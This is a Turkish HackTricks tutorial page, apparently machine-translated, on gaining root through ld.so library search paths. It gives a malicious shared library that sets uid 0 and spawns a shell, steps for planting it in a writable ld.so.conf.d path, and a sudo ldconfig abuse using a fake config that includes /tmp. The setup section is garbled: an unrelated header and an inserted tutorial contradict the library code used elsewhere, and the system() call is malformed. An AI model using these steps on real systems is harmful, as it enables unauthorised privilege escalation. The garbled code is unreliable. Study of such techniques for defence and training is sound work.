# ld.so privesc exploit example

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a> <strong>öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Ortamı hazırlayın

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların kodunu bulabilirsiniz

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```

Bu dosya, özel bir kütüphane olan libcustom'un başlık dosyasıdır. Bu kütüphane, özel işlevler ve özellikler sağlamak için kullanılır.

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

// Özel işlevlerin prototipleri burada tanımlanır
void customFunction1();
void customFunction2();

// Özel yapıların tanımları burada yer alır
typedef struct {
    int customField1;
    char customField2[20];
} CustomStruct;

#endif
```

Bu başlık dosyası, libcustom kütüphanesini kullanacak olan diğer programlar tarafından dahil edilir. Bu sayede, libcustom'un sağladığı işlevler ve yapılar kullanılabilir hale gelir.

```c
#include <stdio.h>

void vuln_func();
```

Bu örnek, bir özel kütüphanenin nasıl yüklenip kullanılacağını göstermektedir. Aşağıdaki adımları izleyerek bu örneği uygulayabilirsiniz:

1. Öncelikle, `libcustom.c` adında bir C dosyası oluşturun.
2. Ardından, aşağıdaki kodu `libcustom.c` dosyasına yapıştırın:

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

3. Daha sonra, `libcustom.c` dosyasını derlemek için aşağıdaki komutu kullanın:

```bash
gcc -shared -o libcustom.so libcustom.c
```

4. Bu komut, `libcustom.c` dosyasını `libcustom.so` adında bir paylaşılan nesne dosyasına derleyecektir.
5. Son olarak, `ld.so.conf` dosyasına aşağıdaki satırı ekleyin:

```
/usr/local/lib
```

Bu satır, `/usr/local/lib` dizinini paylaşılan kütüphane arama yoluna ekleyecektir.

6. Artık `libcustom.so` dosyasını `/usr/local/lib` dizinine taşıyabilirsiniz.

Bu adımları tamamladıktan sonra, `libcustom.so` dosyasını kullanarak özel bir işlevi çağırabilirsiniz.

```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```

{% tabs %}
{% tab title="Bir örnek" %}
1. Bu dosyaları aynı klasöre **oluşturun**
2. **Kütüphaneyi derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` dizinine **kopyalayın**: `sudo cp libcustom.so /usr/lib` (root yetkisi gerektirir)
4. **Yürütülebilir dosyayı derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

#### Ortamı kontrol edin

_libcustom.so_'nun _/usr/lib_ dizininden **yüklenip yüklenmediğini** ve ikili dosyayı **çalıştırabildiğinizi** kontrol edin.
{% endtab %}
{% endtabs %}

```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

## Sızma

Bu senaryoda, _/etc/ld.so.conf/_ içinde bir dosyada **birisi zafiyetli bir giriş oluşturduğunu varsayacağız**:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

Zararlı klasör _/home/ubuntu/lib_ (yazma erişimine sahip olduğumuz yer) içindedir.\
Aşağıdaki kodu indirin ve o yolu içinde derleyin:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```

Şimdi, **hatalı yapılandırılmış** yolun içine **zararlı libcustom kütüphanesini oluşturduğumuza** göre, bir **yeniden başlatma** veya kök kullanıcının **`ldconfig`**'u çalıştırmasını beklememiz gerekiyor (_bu ikiliyi **sudo** olarak çalıştırabilir veya **suid bit**'e sahipse kendiniz çalıştırabilirsiniz_).

Bu gerçekleştiğinde, `sharevuln` yürütülebilir dosyasının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:

```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

Gördüğünüz gibi, **`/home/ubuntu/lib`'den yükleniyor** ve herhangi bir kullanıcı tarafından çalıştırılırsa bir kabuk çalıştırılacak:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
Bu örnekte ayrıcalıkları yükseltmedik, ancak komutları değiştirerek ve **kök veya diğer ayrıcalıklı kullanıcının zafiyetli ikiliyi çalıştırmasını bekleyerek** ayrıcalıkları yükseltebiliriz.
{% endhint %}

### Diğer yanlış yapılandırmalar - Aynı zafiyet

Önceki örnekte, bir yönetici **`/etc/ld.so.conf.d/` içindeki bir yapılandırma dosyasında ayrıcalıklı olmayan bir klasör ayarladığımızı taklit ettik**.\
Ancak, aynı zafiyeti oluşturabilecek diğer yanlış yapılandırmalar da vardır, eğer `/etc/ld.so.conf.d` klasörü içinde veya `/etc/ld.so.conf` dosyasında bazı **yazma izinleriniz** varsa veya `/etc/ld.so.conf.d` içindeki **bir yapılandırma dosyasında**, aynı zafiyeti yapılandırabilir ve sömürebilirsiniz.

## Sömürü 2

**`ldconfig` üzerinde sudo ayrıcalıklarınız olduğunu varsayalım**.\
`ldconfig`'a **hangi yapılandırma dosyalarını yükleyeceğini** belirtebilirsiniz, bu nedenle `ldconfig`'un keyfi klasörleri yüklemesinden yararlanmak için "/tmp" klasörünü yüklemek için gerekli dosya ve klasörleri oluşturalım:

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Şimdi, **önceki saldırıda** belirtildiği gibi, **`/tmp` içinde zararlı bir kütüphane oluşturun**.\
Ve son olarak, yolu yükleyelim ve binary'nin kütüphaneyi nereden yüklediğini kontrol edelim:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**Görüldüğü gibi, `ldconfig` üzerinde sudo yetkilerine sahip olmak aynı zafiyeti sömürmenizi sağlar.**

{% hint style="info" %}
Eğer `ldconfig` suid bitiyle yapılandırılmışsa, bu zafiyeti sömürmek için güvenilir bir yol bulamadım. Aşağıdaki hata görüntülenir: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Referanslar

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB'deki Dab makinesi

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>
